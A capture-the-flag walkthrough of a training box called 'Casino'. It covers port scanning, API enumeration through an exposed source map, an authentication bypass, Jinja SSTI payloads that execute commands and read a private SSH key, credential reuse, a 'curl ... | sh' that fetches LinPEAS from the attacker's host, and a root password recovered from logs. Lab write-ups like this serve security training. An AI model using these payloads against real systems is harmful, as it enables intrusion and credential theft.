# Casino

<img width="800" height="456" alt="26cbdbe6-282f-4d40-baa2-92d3c378c4c1" src="https://github.com/user-attachments/assets/7c0f12e3-f53a-429f-8703-dffd1405ae4a" />

## **Lab Link**

[Casino Link](https://www.hacksmarter.org/courses/32a677fd-323b-4236-ae70-3cda82d9c0b4/take)

## **Box Information**

- **Name**: Casino
- **IP**: VPN
- **Difficulty**: Medium
- **Description**: Las Vegas is gearing up for a massive cybersecurity conference, and you've been hired to conduct a penetration test against one of the casinos. The client - Hack Smarter World - is a luxury resort where many of the attendees will be staying. Your objective is to identify all vulnerabilities and elevate your privileges to root.

---

## **Reconnaissance**

### **Port Scanning**

```
nmap 10.1.255.107 -vv -sCV -A -p22,80,2222 -oN nmap.txt
```

**Results:**

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp   open  http    syn-ack Werkzeug httpd 3.1.8 (Python 3.10.18)
2222/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u7
```

**Analysis:**

- Port 80: Werkzeug/Flask web application (captive portal)
- Port 22: Standard SSH (OpenSSH 9.6p1)
- Port 2222: Alternative SSH (OpenSSH 8.4p1)

---

## **Web Enumeration**

### **Initial Access**

The web application redirects to `/login`:

```
GET / HTTP/1.1
Host: casino.hsm
```

**Response:**

```
HTTP/1.1 302 Found
Location: /login
```

<img width="800" height="456" alt="image" src="https://github.com/user-attachments/assets/2e978a75-a3be-480b-abf8-399905348803" />


### **Source Code Analysis**

The homepage reveals a JavaScript file:

```
<script src="/static/js/app.min.js"></script>
```

<img width="800" height="256" alt="image (1)" src="https://github.com/user-attachments/assets/ad4834c3-3f3a-4c38-b9d6-22ecf06b17cc" />

**app.min.js:**

```
function initPortal() {
    console.log("Hack Smarter World WiFi Gateway Active");
}
document.addEventListener("DOMContentLoaded", initPortal);
//# sourceMappingURL=app.min.js.map
```

### **Source Map Discovery**

Downloading the source map reveals sensitive API endpoints:

```
curl http://casino.hsm/static/js/app.min.js.map
```

**app.min.js.map:**

```
{
    "version": 3,
    "file": "app.min.js",
    "sources": ["src/api/roomVerification.js"],
    "sourcesContent": [
        "// Front-Desk Kiosk API verification helper\nasync function checkRoomStatus(roomNum) {\n const res = await fetch('/api/v1/rooms/status?status=occupied');\n return await res.json();\n}"
    ]
}
```

### **API Enumeration**

Script to enumerate room statuses:

```
#!/bin/bash
for status in "occupied" "vacant" "reserved" "maintenance" "available" "checked_in" "checked_out"; do
    echo "[*] Testing status: $status"
    curl -s "http://casino.hsm/api/v1/rooms/status?status=$status" | jq '.'
done
```

**Result:** API returns guest names and room numbers for occupied rooms:

```
{
  "filter": "occupied",
  "rooms": [
    {
      "checkout": "2026-08-23",
      "guest_name": "Gonzalez",
      "id": 13,
      "room_number": 169,
      "status": "occupied",
      "tier": "Executive Suite"
    }
  ],
  "status": "success",
  "total_records": 100
}
```

### **Authentication Bypass**

Using the exposed API data, we can authenticate to the portal:

```
Room Number: 169
Last Name: Gonzalez
```

**Result:** Successful authentication!

<img width="800" height="456" alt="image (2)" src="https://github.com/user-attachments/assets/bc9466cc-5ce3-4957-8bac-4e4cef5782e2" />





## **Server-Side Template Injection (SSTI)**

### **Discovery**

After logging in, the profile page allows editing user information. Testing for SSTI:

**Payload:**

```
{{7*7}}
```

**Result:** The page displays `49` - SSTI confirmed!

<img width="800" height="456" alt="image (3)" src="https://github.com/user-attachments/assets/dd0b9f91-3a03-4604-b35b-c8c631f7c760" />


### **Remote Code Execution**

**Payload:**

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Result:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<img width="800" height="456" alt="image (4)" src="https://github.com/user-attachments/assets/ea80e5b2-52c9-4683-82b1-38d6123d9759" />


### **Reading Sensitive Files**

**Payload to read George's SSH key:**

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../../home/george/.ssh/id_rsa').read() }}
```

**Result:** Successfully extracted `george` user's private SSH key!

<img width="800" height="456" alt="image (5)" src="https://github.com/user-attachments/assets/b2804dbf-b354-44d4-9b6c-7db2f2c0ea80" />





## **SSH Access**

### **Connecting as George**

```
chmod 600 george_key
ssh -i george_key -p 2222 george@casino.hsm
```

**Result:** Successfully logged in as `george`:

```
george@0e799dcd0c3a:~$ id
uid=1000(george) gid=1000(george) groups=1000(george)
```

### **Finding David's Password**

**Check command history:**

```
george@0e799dcd0c3a:~$ cat .bash_history
mysql -u david -p'~~password~~' -h 127.0.0.1 resort_db
```

**Switch to David:**

```
george@0e799dcd0c3a:~$ su david
Password: ~~password~~
david@0e799dcd0c3a:/home/george$
```

---

## **Privilege Escalation to Root**

### **Enumeration with LinPEAS**

Since `david` has limited privileges, we run LinPEAS to find escalation vectors:

```
david@0e799dcd0c3a:~$ curl -L https://YOUR-VPN-IP/linpeas.sh | sh
```

### **Finding the Root Password**

**Key Discovery:** User `david` is in the `adm` group:

```
david@0e799dcd0c3a:~$ id
uid=1001(david) gid=1001(david) groups=1001(david),4(adm)
```

<img width="800" height="456" alt="image (6)" src="https://github.com/user-attachments/assets/4e061de5-3200-4d4a-b45e-4fa21b2a9cad" />


The `adm` group allows reading system logs. Checking `/var/log/provisioning.log` reveals the root password:

```
david@0e799dcd0c3a:~$ cat /var/log/provisioning.log
...
root password changed to: '~~root_password~~'
...
```

<img width="800" height="456" alt="image (7)" src="https://github.com/user-attachments/assets/041ed8fc-32da-41d0-87c9-f90722ce059a" />


### **Getting Root Shell**

```
david@0e799dcd0c3a:~$ su root
Password: ~~root_password~~
root@0e799dcd0c3a:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## **Capturing the Flag**

```
root@0e799dcd0c3a:~# ls -la
total 24
drwx------ 1 root root 4096 Aug 25 18:14 .
drwxr-xr-x 1 root root 4096 Aug 25 18:13 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root    0 Jul 22  2025 .python_history
-rw-r--r-- 1 root root  169 Jul 22  2025 .wget-hsts
-rw------- 1 root root   39 Aug 25 18:14 root.txt

root@0e799dcd0c3a:~# cat root.txt
HSM{FLAGGGGGGGGG}
```

---

## **Vulnerabilities Identified**

| **#** | **Vulnerability** | **Severity** | **Impact** |
| --- | --- | --- | --- |
| 1 | **Exposed Source Map** | Critical | Revealed API endpoints |
| 2 | **Unauthenticated API** | Critical | Guest data exposure |
| 3 | **SSTI (Server-Side Template Injection)** | Critical | RCE |
| 4 | **Weak Credential Storage** | High | Password in .bash_history |
| 5 | **Insecure Logging** | High | Root password in plaintext |
| 6 | **Default Adm Group Permissions** | Medium | Log access leading to root |
